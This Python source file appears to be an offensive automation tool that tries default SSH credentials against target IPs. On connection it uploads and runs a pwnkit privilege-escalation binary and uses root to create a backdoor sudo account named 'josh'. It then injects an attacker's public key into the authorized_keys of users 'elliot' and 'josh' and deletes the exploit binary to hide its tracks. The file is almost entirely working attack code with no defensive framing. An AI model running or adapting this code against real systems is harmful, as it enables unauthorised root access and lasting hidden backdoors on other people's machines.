import paramiko
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class UserIP:
	def __init__(self, ip_address, credentials, public_ssh_key_to_inject):
		self.ip_address = ip_address
		self.got_root = False
		self.credentials = credentials
		self.public_ssh_key_to_inject = public_ssh_key_to_inject

	def __repr__(self) -> str:
		"""
		Represent the Object as a string
		"""
		return f"{type(self).__name__}({self.ip_address})"

	def __check_login(self, username, password, is_sudo_user, exploit_pwnkit=True):
		"""
		Returns True if we successfully got root, and returns False otherwise
		"""
		try:
			got_root = False
			logger.info(f"Connecting to {username}@{self.ip_address}...")
			ssh_client = paramiko.SSHClient()
			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh_client.connect(self.ip_address, username=username, password=password, timeout=5)
			logger.info(f"{COLOR_OKGREEN}Successfully connected to {username}@{self.ip_address}{COLOR_END}")
		except paramiko.AuthenticationException as err:
			logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{self.ip_address}. The user most likely changed their password!{COLOR_END}")
			return False
		except Exception as err:
			logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{self.ip_address}{COLOR_END}")
			return False

		if is_sudo_user:
			got_root = True
		elif exploit_pwnkit: # only attempt to exploit pwnkit if we're not already a sudo user
			got_root = self.exploit_pwnkit(ssh_client=ssh_client, username=username)

		ssh_client.close()
		return got_root

	def exploit_pwnkit(self, ssh_client, username):
		"""
		Exploits pwnkit over an existing SSH connection
		"""
		try:
			logger.info("Copying pwnkit_x64 binary over SSH...")
			sftp = ssh_client.open_sftp()
			pwnkit_binary_name = "pwnkit_x64"
			pwnkit_destination_path = f"/home/{username}/{pwnkit_binary_name}"
			sftp.put(localpath=f"./exploits/{pwnkit_binary_name}", remotepath=pwnkit_destination_path, confirm=True)
			logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH.")
			sftp.close()

			logger.info("Setting the pwnkit binary to be executable...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"chmod +x ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully set the pwnkit binary to be executable.")

			logger.info("Checking for root privileges...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | ./{pwnkit_binary_name}")
			output_as_string = ssh_stdout.read().decode().strip()
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.debug(f"'whoami' output: {output_as_string}")

			logger.info("Creating sudo user to log in as...")
			useradd_command = "useradd -m josh -g sudo -s /bin/bash"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{useradd_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully created user to log in as.")

			logger.info("Adding SSH key to elliot's authorized keys...")
			add_ssh_key_command = f"grep -qxF \"{self.public_ssh_key_to_inject}\" /home/elliot/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/elliot/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to elliot's authorized keys.")

			logger.info("Adding SSH key to josh's authorized keys...")
			# the following line is a little complex, first we create the .ssh directory if it doesn't exist, then check if our public SSH key is in the authorized keys, then we add it to the authorized keys if it is not already there
			add_ssh_key_command = f"mkdir -p /home/josh/.ssh && grep -qxF \"{self.public_ssh_key_to_inject}\" /home/josh/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/josh/.ssh/authorized_keys"
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully added SSH key to josh's authorized keys.")

			logger.info("Cleaning up pwnkit binary...")
			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'rm {pwnkit_destination_path}' | ./{pwnkit_binary_name}")
			ssh_stderr_text = ssh_stderr.read().decode().strip()
			if ssh_stderr_text != "":
				logger.error(ssh_stderr_text)
			logger.info("Successfully cleaned up up pwnkit binary.")

			ssh_client.close()

			if output_as_string == "root":
				logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{self.ip_address}{COLOR_END}")
				return True
			else:
				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to pwnkit{COLOR_END}")
				return False
		except Exception as err:
			logger.exception(err)
			return False

	def check_all_logins(self, return_when_root=True):
		"""
		Tries to connect using all default credentials

		return_when_root: If set to False, all logins will be checked regardless of whether or not we successfully got root
		"""
		for credential in self.credentials:
			try:
				got_root = self.__check_login(username=credential["username"], password=credential["password"], is_sudo_user=credential["sudo_user"])
				if got_root:
					logger.info(f"{COLOR_OKBLUE}Successfully got root on {self.ip_address}{COLOR_END}")
					if return_when_root:
						break
			except Exception as err:
				pass
